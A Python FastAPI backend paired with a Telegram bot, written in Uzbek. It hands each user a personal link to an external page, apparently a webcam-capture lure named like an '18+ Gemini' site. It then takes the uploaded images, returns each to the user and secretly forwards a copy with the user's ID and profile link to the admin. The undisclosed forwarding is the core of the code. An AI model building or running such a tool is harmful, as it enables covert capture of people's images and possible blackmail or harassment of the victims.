import base64
from contextlib import asynccontextmanager
import os
from pathlib import Path
import uuid

from dotenv import load_dotenv
from fastapi import FastAPI, HTTPException
from fastapi.middleware.cors import CORSMiddleware
from pydantic import BaseModel
from telegram import Bot, InlineKeyboardButton, InlineKeyboardMarkup, Update
from telegram.ext import Application, CommandHandler, ContextTypes

load_dotenv()

TOKEN = os.getenv("BOT_TOKEN")
ADMIN_ID_RAW = os.getenv("ADMIN_ID")

if not TOKEN:
    raise RuntimeError("BOT_TOKEN kiritilmagan!")
if not ADMIN_ID_RAW:
    raise RuntimeError("ADMIN_ID kiritilmagan!")

ADMIN_ID = int(ADMIN_ID_RAW)

NETLIFY_URL = "https://gemini18oytekin.netlify.app"

# Telegram Bot sozlamalari
tg_app = Application.builder().token(TOKEN).build()


# --- /start buyrug'i ---
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    bot_username = (await context.bot.get_me()).username

    # 1. ADMIN UCHUN TUGMALAR
    if user_id == ADMIN_ID:
        keyboard = [
            [
                InlineKeyboardButton(
                    "⚙️ Admin Paneli / Test Link",
                    url=f"{NETLIFY_URL}/?uid={user_id}",
                )
            ]
        ]
        reply_markup = InlineKeyboardMarkup(keyboard)
        await update.message.reply_text(
            "👑 **Xush kelibsiz, Admin!**\n\nSiz bot tizimidasiz. Tizim soz holatda ishlamoqda.",
            reply_markup=reply_markup,
            parse_mode="Markdown",
        )

    # 2. FOYDALANUVCHI UCHUN TUGMALAR
    else:
        personal_link = f"{NETLIFY_URL}/?uid={user_id}"
        keyboard = [
            [InlineKeyboardButton("📸 Rasmga olish", url=personal_link)]
        ]
        reply_markup = InlineKeyboardMarkup(keyboard)
        await update.message.reply_text(
            "Salom! 👋\n\nXizmatdan foydalanish uchun quyidagi tugmani bosing:",
            reply_markup=reply_markup,
        )


tg_app.add_handler(CommandHandler("start", start))


# Bot va FastAPI birgalikda ishlashi
@asynccontextmanager
async def lifespan(app: FastAPI):
    await tg_app.initialize()
    await tg_app.start()
    await tg_app.updater.start_polling()
    yield
    await tg_app.updater.stop()
    await tg_app.stop()
    await tg_app.shutdown()


app = FastAPI(lifespan=lifespan)

app.add_middleware(
    CORSMiddleware,
    allow_origins=["*"],
    allow_credentials=False,
    allow_methods=["POST", "OPTIONS"],
    allow_headers=["*"],
)

bot = Bot(TOKEN)
UPLOADS = Path("uploads")
UPLOADS.mkdir(exist_ok=True)


class Photo(BaseModel):
    uid: int
    image: str


@app.get("/health")
async def health():
    return {"ok": True}


# --- Rasm qabul qilish va yuborish ---
@app.post("/upload")
async def upload(photo: Photo):
    if photo.uid <= 0:
        raise HTTPException(400, "Invalid user id")

    try:
        header, encoded = photo.image.split(",", 1)
        if not header.startswith("data:image/"):
            raise ValueError
        raw = base64.b64decode(encoded)
    except Exception:
        raise HTTPException(400, "Invalid image")

    if not raw or len(raw) > 10 * 1024 * 1024:
        raise HTTPException(413, "Image too large")

    path = UPLOADS / f"{uuid.uuid4().hex}.jpg"
    path.write_bytes(raw)

    bot_info = await bot.get_me()
    bot_link = f"https://t.me/{bot_info.username}"

    try:
        # A) FOYDALANUVCHIGA BORADIGAN RASM VA TUGMA
        user_keyboard = InlineKeyboardMarkup(
            [[InlineKeyboardButton("🤖 Botga qaytish", url=bot_link)]]
        )
        with path.open("rb") as f:
            await bot.send_photo(
                chat_id=photo.uid,
                photo=f,
                caption="✅ Suratingiz ko'rinib qoldi!",
                reply_markup=user_keyboard,
            )

        # B) ADMINGA BORADIGAN RASM VA TUGMA (Foydalanuvchiga profil havolasi bilan)
        admin_keyboard = InlineKeyboardMarkup(
            [[
                InlineKeyboardButton(
                    "👤 Foydalanuvchi profili", tg_user_id=photo.uid
                )
            ]]
        )
        with path.open("rb") as f:
            await bot.send_photo(
                chat_id=ADMIN_ID,
                photo=f,
                caption=f"📥 **Yangi rasm keldi!**\n\n🆔 User ID: `{photo.uid}`",
                parse_mode="Markdown",
                reply_markup=admin_keyboard,
            )

    finally:
        path.unlink(missing_ok=True)

    return {"ok": True}
